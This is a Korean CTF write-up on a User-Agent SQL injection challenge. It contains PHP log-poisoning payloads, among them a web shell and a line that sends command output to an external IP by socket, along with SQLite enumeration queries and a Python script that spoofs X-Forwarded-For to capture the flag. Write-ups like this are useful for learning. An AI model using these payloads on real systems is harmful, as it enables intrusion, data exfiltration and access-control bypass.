
# 키워드
- sqli

# 풀이과정
- user-agent를 변조하는 문제
- 초기에는 헤더를 변조해 log poisoning하는 문제인 줄 알았으나 유효하지 않았음

```

GET /index.html HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; 
             Trident/5.0; <?php system($_GET['cmd']); ?>)


GET /index.html HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; 
             Trident/5.0; <?php
    $output = shell_exec('ls');
    $sock = fsockopen('211.250.216.249', 7000);
    fwrite($sock, $output);
    fclose($sock);
?>

```

- 특수문자 넣다보니 sqli인걸 알게 됨
- `User-Agent: admin" or "1"="1` 를 통해 서버에 접속을 할 수 있었으나, ip가 올바르지 않다고 reject당함
- sqli를 통해 db 정보를 유출해야 함
- 구글링을 통해 DBMS 특정할 수 있는 다양한 쿼리를 사용하여 sqlite임을 알아냈고 이를 이용하여
- 시스템 테이블 탐색 시작 응답 패킷을 통해 하나의 정보를 유출시킬 수 있는데 아래 쿼리들을 통해 하나씩 정보를 얻어내whitelist ip를 얻어냄

```sql
admin" OR "1"="1" AND sqlite_version() LIKE "3%"; --
admin" union select tbl_name from sqlite_master; --
admin" union select tbl_name from sqlite_master limit 1 offset 2; --	->white_list
admin" UNION SELECT sql FROM sqlite_master WHERE type="table" AND name="white_list"; --
CREATE TABLE white_list (
	no INTEGER NOT NULL,
	ip TEXT NOT NULL UNIQUE,
	PRIMARY KEY (no)
)"}

admin" UNION SELECT ip from white_list; --	->19.98.12.18
```

- 이를 X-Forwarded-For 필드에 넣어 플래그를 얻을 수 있음
- X-Forwarded-For 필드는 요청 ip가 어딘지를 식별하는 가장 표준적인 헤더임 
```python
# import requests

# url = "http://kknock.org:10002/api/bot_check"

# #and ascii(substring((select schema_name from information_schema.schemata limit 1), 1, 1))<79;

# headers = {
#     "User-Agent": 'admin" UNION SELECT ip from white_list limit 1 offset 1; --',
#     "Accept": "*/*",
#     "Referer": "http://kknock.org:10002/login",
#     "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
# }

# response = requests.get(url, headers=headers)

# print(response.text)

import requests

url = 'http://kknock.org:10002/login'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'a" union select "19.98.12.18";-- -',
    'Referer': 'http://kknock.org:10002/login',
    'Cookie': 'session=.eJxNy0sKgCAURuGtXP6xCjZS24ogFpcQ6go-RtHea9j0fJwbWx1J8sUIsN54Z-xirINC6ekzhNEmK8zOLeWD5SvIETSlVKHOJ--D4v-NWLUmjecFL4YbLQ.ZYZPhA.5xcfW1ZmBWteeW6chi7sbA9NQgw',
    'Host' : "19.98.12.18",
    'X-Forwarded-For' : "19.98.12.18"
}
data = {
    'password': 'djenadls~?'
}
proxies = {
    'http': 'http://19.98.12.18:80',
    'https': 'http://19.98.12.18:443'
}

response = requests.post(url, headers=headers, data=data)
print(response.text)

#KCTF{X_F0Rw4RD3D_4_and_s1Mp1e_5qli}
```

# flag
![[Pasted image 20231230043821.png]]

